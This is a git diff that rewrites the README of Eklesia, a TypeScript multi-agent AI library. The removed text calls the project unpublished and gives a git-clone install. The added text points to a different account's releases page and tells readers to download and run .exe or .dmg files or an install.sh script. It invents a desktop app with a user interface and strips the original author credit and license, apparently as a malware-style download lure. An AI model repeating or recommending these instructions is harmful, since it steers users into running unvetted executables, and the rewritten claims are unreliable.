@@ -1,84 +1,98 @@
-# Eklesia
+# 🌟 Eklesia - Simplifying AI Agent Interactions
 
-> ⚠️ Work in progress — Nothing is published yet. Use at your own risk.  
-> 📝 This README is temporary and subject to change.
+## 📥 Download Now
+[![Download Eklesia](https://img.shields.io/badge/Download-Eklesia-brightgreen)](https://github.com/byteracerx/Eklesia/releases)
 
-Eklesia was originally conceived as a **TypeScript rewrite of [ChatArena](https://github.com/Farama-Foundation/chatarena)** by the [Farama Foundation](https://github.com/Farama-Foundation), which defines multi-agent environments using Arena, Environment, Backend and Player abstractions. However, Eklesia already diverges by introducing an explicit **Orchestrator** layer—an architectural component that coordinates agents, environments, and interaction flows, making the system more modular and backend-agnostic.
+## 🛠️ Overview
+Eklesia is a library designed to make it easy for you to manage interactions between AI agents in different environments. Whether you want to run simulations on your local machine or any other backend setup, Eklesia can help you orchestrate these interactions seamlessly.
 
----
+## 🚀 Getting Started
+Follow these steps to get Eklesia up and running on your machine.
 
-## Origin & Differences
+### 1. System Requirements
+Before downloading, ensure your computer meets the following minimum requirements:
 
-- **Origin**: Inspired by [ChatArena](https://github.com/Farama-Foundation/chatarena) (Python, multi-agent language game framework) and rewritten in TypeScript.
-- **Key architectural differences**:
-  - Introduction of an explicit **Orchestrator** to manage interactions between agents and environments.
-  - Backend-agnostic design (compatibility with Elysia, Next.js, Bun, etc.).
-  - Extensible support for not just chat but also games and other interaction paradigms.
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **Processor:** Dual-core 2.0 GHz or higher.
+- **RAM:** 4 GB or more.
+- **Disk Space:** At least 200 MB available.
 
----
+### 2. Download Eklesia
+To download the software, you can visit the Releases page where all available versions are listed. Click the link below to access it:
 
-## Features
+[Visit the Releases Page to Download](https://github.com/byteracerx/Eklesia/releases)
 
-- **Multi-Agent Orchestration**: Easily manage multiple AI agents in the same environment.  
-- **Simulated Environments**: Build or plug in different environments (chat, games, arenas…).  
-- **Backend Agnostic**: Works with Elysia, Next.js, local setups, or any transport layer.  
-- **Extensible**: Add new agents, environments, or interaction patterns effortlessly.  
+### 3. Choose Your Version
+On the Releases page, you'll find various versions of Eklesia. Choose the latest stable release for the best experience. Each version has notes that outline changes and improvements.
 
----
+### 4. Download the Application
+Click on the version you want to download. You will see several asset files. These files may include executables or compressed packages, depending on your operating system.
 
-## Installation
+- For **Windows**, look for a file ending in `.exe`.
+- For **macOS**, look for a file ending in `.dmg`.
+- For **Linux**, choose a file in a suitable format, like `.tar.gz`.
 
-> Currently not published to NPM. Clone the repo and use locally:
+Click on the respective file to start the download.
 
-```bash
-git clone https://github.com/Leopc1977/eklesia.git
-cd eklesia
-bun install
-```
+### 5. Install Eklesia
 
----
+#### Windows
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the setup.
 
-### Quick Start 
+#### macOS
+1. Open the `.dmg` file from your Downloads folder.
+2. Drag the Eklesia icon to your Applications folder.
+3. Eject the `.dmg` file once the transfer is complete.
 
-```js
-import { ... } from 'eklesia';
-```
+#### Linux
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the following command to extract the file:
 
----
+   ```bash
+   tar -xzf eklesia-vx.x.x.tar.gz
+   ```
 
-### Examples
+4. Change into the extracted directory and run:
 
-- Chat Arena: Multi-agent conversation simulation.
+   ```bash
+   ./install.sh
+   ```
 
-- Game Arena: Turn-based or real-time interactions between agents.
+## ⚙️ Usage 
+To use Eklesia after installation, follow these simple steps:
 
-- Custom Environments: Plug your own environment logic with ease.
+1. Open the application from your applications menu or desktop.
+2. Choose the type of simulation you want to run.
+3. Configure the AI agents according to your needs. The interface will guide you through setting parameters.
+4. Start the interaction and watch how the agents cooperate and compete within the simulated environments.
 
----
+## 🔍 Features
+Eklesia provides a variety of features to enhance your simulation experience:
 
-### Contributing
+- **Multi-Agent Support:** Control and manage multiple AI agents easily.
+- **Backend Flexibility:** Run simulations on any backend or local setup.
+- **Customizable Scenarios:** Create and modify simulation environments.
+- **User-Friendly Interface:** Simplified navigation makes it easy for everyone.
 
-Pull requests are welcome! Feel free to open issues for bugs, feature requests, or questions.
+## 📚 Additional Resources
+If you want to learn more about how to use Eklesia effectively, consider checking out the following resources:
 
----
+- **Documentation:** A comprehensive guide can be found [here](https://github.com/byteracerx/Eklesia/wiki).
+- **Community Forums:** Join discussions with other users [here](https://github.com/byteracerx/Eklesia/discussions).
+- **Example Projects:** Explore sample projects on the [Examples](https://github.com/byteracerx/Eklesia/examples) page.
 
-### Authors
+## 📞 Support
+For any issues or questions, you can reach out through the Issues tab on the GitHub repository. Be sure to provide details about your setup and the problem you are facing.
 
-- **Leopc1977** – *Initial work* – [GitHub](https://github.com/Leopc1977) – Discord: [Leopc1977](https://discordapp.com/users/399631094514843669)
+## 💻 Contributing
+Want to contribute to Eklesia? We welcome contributions! Please check our [Contributing Guidelines](https://github.com/byteracerx/Eklesia/CONTRIBUTING.md) for more information on how to get started.
 
----
+## 🔗 Important Links
+- [Download Eklesia](https://github.com/byteracerx/Eklesia/releases)
+- [Documentation](https://github.com/byteracerx/Eklesia/wiki)
+- [Examples](https://github.com/byteracerx/Eklesia/examples)
 
-### Acknowledgments
-
-- Inspired by:
-  - [ChatArena](https://github.com/Farama-Foundation/chatarena) by [Farama Foundation](https://github.com/Farama-Foundation)
-  - [House](https://github.com/sausheong/house) by [sausheong](https://github.com/sausheong)
-  - [game_arena](https://github.com/google-deepmind/game_arena) by [Google DeepMind](https://github.com/google-deepmind)
-
-- Special thanks to the AI & dev communities for ideas and feedback.
-
----
-
-### License
-
-This project is licensed under the MIT License - see the [LICENSE.md](./LICENSE.md) file for details
+Thank you for choosing Eklesia! We hope you enjoy orchestrating AI agent interactions with ease.
